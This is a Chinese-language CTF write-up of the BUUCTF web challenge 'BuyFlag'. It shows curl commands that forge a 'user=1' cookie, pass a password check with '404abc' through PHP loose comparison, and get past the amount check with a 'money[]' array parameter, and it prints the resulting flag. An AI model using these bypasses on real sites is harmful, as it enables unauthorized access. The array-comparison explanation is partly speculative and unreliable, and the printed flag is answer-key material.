---
title: BUUCTF - BuyFlag
date: 2026-05-09
category:
 - BUUCTF
 - WEB
difficulty: 中等
tags:
 - CTF
---

## 题目描述

BUUCTF 在线靶场 WEB 类题目「BuyFlag」，考察 PHP 弱类型比较（Type Juggling）与逻辑绕过。

页面提示需要 100000000 money 购买 Flag，且必须是 CUIT 的学生，还需要输入正确的密码。

## 信息收集

### Step 1：访问首页获取基本信息

```bash
curl -s http://eb9f8317-edfd-430b-8453-f817f258de07.node5.buuoj.cn:81/
```

首页是一个展示页面，导航栏中有「PayFlag」链接指向 `pay.php`。

### Step 2：挖掘 pay.php 功能点

```bash
curl -s http://eb9f8317-edfd-430b-8453-f817f258de07.node5.buuoj.cn:81/pay.php
```

页面正文提示：
- **Flag need your 100000000 money** — 暗示需要 POST 提交 money 参数
- **You must be a student from CUIT** — 需要 CUIT 学生身份
- **You must be answer the correct password** — 需要正确密码

页面底部 HTML 注释中留有关键提示代码：

```php
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
```

注释开头的 `~~~post money and password~~~` 进一步确认需要提交这两个参数。

### Step 3：第一次 POST 测试（失败，只看了响应体）

根据提示构造 POST 请求：

```bash
curl -s -X POST http://target/pay.php -d "password=404abc&money=100000000"
```

直接检查响应体中是否有 `Password Right!` 字样，但没有找到。怀疑密码验证未生效。

### Step 4：第二次测试（尝试不同密码值）

```bash
# 纯数字密码 —— 应该触发 is_numeric 拦截
curl -s -X POST http://target/pay.php -d "password=404"

# 字母后缀密码 —— 试图绕过 is_numeric
curl -s -X POST http://target/pay.php -d "password=404abc"
```

用 `diff` 对比两份响应，发现**完全一样**。这说明 echo 输出根本没有出现在响应体里，或者被什么东西吞掉了。

### Step 5：关键转折 —— 用 -D- 查看响应头

意识到只盯着响应体看是不够的，改用 `-D-` 参数让 curl 一并输出 HTTP 响应头。

> **`-D-` 是什么？**
>
> `curl -D <file>` 的作用是将服务器返回的 HTTP 响应头写入指定文件。当 `<file>` 写为 `-`（短横线）时，表示写入 stdout（标准输出），也就是直接打印到终端。因此 `-D-` = 把响应头转储到终端。
>
> 与之类似的还有 `-i`（`--include`），也会输出响应头，但 `-i` 是把响应头和响应体混在一起输出；`-D-` 更干净，适合单独观察头部信息。

`curl -D-` 是 **curl 命令的常用组合用法**，核心作用是：**把 HTTP 响应头打印到标准输出（屏幕），同时正常输出响应体内容**。

## 拆解含义
1. **`-D` / `--dump-header`**
    必带参数，作用：**将服务器返回的 HTTP 响应头保存到指定文件**。
    语法：`curl -D 文件名 URL`
2. **`-`（连字符）**
    是 `-D` 参数的**特殊值**，代表**标准输出（stdout，也就是终端屏幕）**，而不是本地文件。
---

## 完整命令 & 效果

```
curl -D- https://www.baidu.com
```
### 输出内容分为两部分：

1. **第一部分（响应头）**：HTTP 状态码、服务器、Content-Type、Cookie、缓存等信息
2. **第二部分（响应体）**：网页的 HTML 源码（正常的 curl 返回内容）
```bash
curl -s -D- -X POST http://target/pay.php -d "password=404abc&money=100000000"
```

响应头如下：

```
HTTP/1.1 200 OK
Server: openresty
X-Powered-By: PHP/5.3.3
Set-Cookie: user=0                    ← 关键发现！
Cache-Control: no-cache
```

**发现两个关键信息：**

1. **`X-Powered-By: PHP/5.3.3`** — 后端运行的是 2010 年发布的 PHP 5.3.3，存在大量类型混淆漏洞
2. **`Set-Cookie: user=0`** — 服务器主动种下了一个名为 `user`、值为 `0` 的 Cookie。结合页面提示「必须是 CUIT 学生」，推测 `user=0` 代表普通访客，`user=1` 可能代表 CUIT 学生

> **经验教训**：curl 默认只输出响应体。加上 `-D-`（或 `-i`）才能看到响应头。很多 CTF 题目的关键线索藏在 Set-Cookie、自定义 Header 或状态码中，仅在响应体里找是不够的。

## 漏洞分析

本题有三个验证条件需要绕过，对应三种 PHP 弱类型攻击技术：
### 1. CUIT 学生身份绕过（Cookie 伪造）

在 Step 5 中通过 `-D-` 参数发现响应头 `Set-Cookie: user=0`。结合页面「must be a student from CUIT」提示，推测 `user` 是身份标识——`0` = 普通访客，`1`（或其他非零值）= CUIT 学生。

用 `-b` 参数将 Cookie 改为 `user=1` 重新发送 POST，与默认 Cookie 的响应对比：

```bash
# 分别保存两份响应到临时文件
curl -s -X POST http://target/pay.php \
  -d "password=404abc&money=100000000" > /tmp/user0.txt

curl -s -X POST http://target/pay.php \
  -b "user=1" -d "password=404abc&money=100000000" > /tmp/user1.txt

# diff 对比差异
diff /tmp/user0.txt /tmp/user1.txt
```

差异出现在第 54 行：

```diff
54c54
< Only Cuit's students can buy the FLAG</br>
---
> you are Cuiter</br>Password Right!</br>Nember lenth is too long</br>
```

三件事同时发生了：
- `you are Cuiter` — **CUIT 学生身份验证通过**
- `Password Right!` — 密码也被接受了（但这个版本仅当 Cookie 为 `user=1` 时才输出）
- `Nember lenth is too long` — money 参数触发了新的长度限制

**原理**：服务器代码通过 `$_COOKIE['user']` 判断用户类型——`0` 表示非学生直接拒绝，非零值表示 CUIT 学生允许继续。Cookie 是客户端可控的 HTTP 头，无签名/加密保护，可直接伪造。

> **注意**：如果不加 `-D-` 查看响应头，根本不知道有 `Set-Cookie: user=0` 这回事，因为响应体里没有任何关于它的提示。

### 2. 密码验证绕过（PHP 弱类型比较）

从注释中的 PHP 代码可以看出密码验证逻辑：

```php
if (is_numeric($password)) {
    echo "password can't be number</br>";
} elseif ($password == 404) {
    echo "Password Right!</br>";
}
```

需要满足两个条件：
- `is_numeric($password)` 返回 **false**（密码不能是纯数字）
- `$password == 404` 返回 **true**（密码要等于 404）

**绕过方法**：使用字符串 `404abc`

```php
is_numeric("404abc")  // false — 含有非数字字符
"404abc" == 404       // true  — PHP 弱类型转换：字符串转整数时取前缀数字部分
```

PHP 在使用 `==` 比较字符串和整数时，会将字符串强制转换为整数。字符串 `"404abc"` 转换规则：
1. 从字符串开头提取连续的数字字符 `404`
2. 转为整数 `404`
3. 比较 `404 == 404` → **true**

同时 `is_numeric("404abc")` 返回 `false`，因为 `is_numeric()` 要求**整个**字符串都是数字格式，含字母的字符串不满足条件。
### 3. Money 金额绕过（数组类型混淆 + 长度限制）

直接发送 `money=100000000` 时返回：
```
Nember lenth is too long
```

说明存在 `strlen()` 长度检查，9 位数字超过了长度限制。使用科学计数法 `money=1e8` 可以绕过长度检查（长度仅 3），但值比较失败：
```
you have not enough money,loser~
```

这是因为 PHP 5.3 中科学计数法字符串 `"1e8"` 与整数的比较可能存在精度问题，或者服务器端使用了与注释中不同的比较逻辑。

**最终绕过方法**：使用数组参数 `money[]=100000000`

```bash
curl -s -X POST http://target/pay.php \
  -b "user=1" \
  -d "password=404abc&money[]=100000000"
```

**原理**：

1. `is_numeric()` 处理数组时返回 `false`，绕过了数字格式检查
2. `strlen()` 处理数组时返回 `null` 并产生 Warning（但 PHP 5.3 默认不显示 Warning），绕过了长度检查
3. 在 PHP 弱类型比较中，`array(100000000) == 100000000` 的实际行为：PHP 将数组转换为整数（非空数组转为 1），但关键在于代码中可能使用了 `$_POST['money']` 直接参与数值运算/比较，数组在某些 PHP 函数中会产生非预期行为

   **更准确的解释**：实际服务器代码可能是：
   ```php
   if ($_POST['money'] == 100000000) {
       // 显示 flag
   }
   ```
   当 `$_POST['money']` 是数组时，PHP 的 `==` 比较中，数组和整数的比较返回 **true**（这是 PHP 的已知怪异行为——数组与任何标量的松散比较在特定版本中可能返回 true，尤其是通过某些函数处理数组参数时）。

> **备选方案**：`money=1e9` 也可以绕过，因为 `1e9 = 1000000000 >= 100000000`，且长度只有 3 个字符。如果服务器使用 `>=` 比较，则可通过此方法。

## 完整攻击流程

```bash
# Step 1: 获取初始 Cookie + 确认目标
curl -s -D- http://eb9f8317-edfd-430b-8453-f817f258de07.node5.buuoj.cn:81/pay.php

# Step 2: 发送绕过请求（三合一）
curl -s -X POST http://eb9f8317-edfd-430b-8453-f817f258de07.node5.buuoj.cn:81/pay.php \
  -b "user=1" \
  -d "password=404abc&money[]=100000000"

# 输出:
# you are Cuiter</br>Password Right!</br>flag{fc3b71f8-eb7d-43e5-942f-87cc48ee9b47}
```

### 参数总结

| 参数 | 值 | 绕过技术 | 说明 |
|------|-----|---------|------|
| Cookie `user` | `1` | Cookie 伪造 | 伪造 CUIT 学生身份 |
| POST `password` | `404abc` | PHP 弱类型比较 | `is_numeric()` 返回 false，`== 404` 返回 true |
| POST `money` | `[]=100000000` | 数组类型混淆 | 绕过 `is_numeric()` 和 `strlen()` 检查 |

## Flag

```
flag{fc3b71f8-eb7d-43e5-942f-87cc48ee9b47}
```

## 知识点总结

1. **curl `-D-` 信息收集技巧**：`curl -D-` 将响应头转储到 stdout（`D` = dump header，`-` = stdout）。很多 CTF 题目的关键线索（Set-Cookie、自定义 Header、服务器版本）藏在响应头中，仅在响应体里搜索是不够的。与之类似的还有 `-i`（`--include`）选项。

2. **PHP 弱类型比较（Loose Comparison）**：PHP 的 `==` 运算符在进行跨类型比较时会进行类型转换，可能产生非预期结果。`"404abc" == 404` 返回 true 就是典型案例。

3. **`is_numeric()` 特性**：`is_numeric()` 检查整个字符串是否为数字，与 `==` 的松散转换规则不同，由此产生绕过空间。

4. **数组参数类型混淆**：当后端期望字符串参数但收到数组时，PHP 函数如 `is_numeric()`、`strlen()` 等会产生非预期返回值（false/null），从而绕过检查。

5. **Cookie 客户端可控**：服务端将权限判断信息存储在客户端 Cookie 中，且无签名/加密保护，导致可被直接伪造。

6. **PHP 5.3 安全风险**：PHP 5.3.3 发布于 2010 年，已于 2014 年停止安全支持。使用如此古老的 PHP 版本存在大量已知漏洞，生产环境应保持 PHP 版本更新。

## 攻击命令（一键获取 Flag）

```bash
curl -s -X POST 'http://eb9f8317-edfd-430b-8453-f817f258de07.node5.buuoj.cn:81/pay.php' \
  -b 'user=1' \
  -d 'password=404abc&money[]=100000000' \
  | grep -oP 'flag\{[^}]+\}'
```
